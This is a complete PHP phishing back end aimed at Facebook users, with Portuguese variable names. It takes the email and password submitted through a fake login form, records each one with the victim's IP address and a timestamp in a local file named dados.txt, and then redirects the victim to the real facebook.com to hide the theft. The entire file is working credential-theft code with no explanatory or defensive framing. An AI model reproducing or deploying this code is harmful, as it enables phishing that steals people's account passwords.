<?php

$ip = $_SERVER["REMOTE_ADDR"]."\r\n";
$hora = date("Y-m-d  #  H:i:s")."\r\n";
$email=$_POST['email']."\r\n";
$senha=$_POST['password']."\r\n";

$traco="==============FACEBOOK==============="."\r\n";
$seuip="IP: ";
$seuhora="HORA: ";
$seuemail="EMAIL: ";
$seusenha="SENHA: ";

$file = fopen("dados.txt","a");
$escrever0=fwrite($file, $traco);
$escrever1=fwrite($file, $seuip);
$escrever2=fwrite($file, $ip);
$escrever3=fwrite($file, $seuhora);
$escrever4=fwrite($file, $hora);
$escrever5=fwrite($file, $seuemail);
$escrever6=fwrite($file, $email);
$escrever7=fwrite($file, $seusenha);
$escrever8=fwrite($file, $senha);
fclose($file);
?>
<script language="JavaScript"> 
window.location="https://facebook.com"; 
</script> 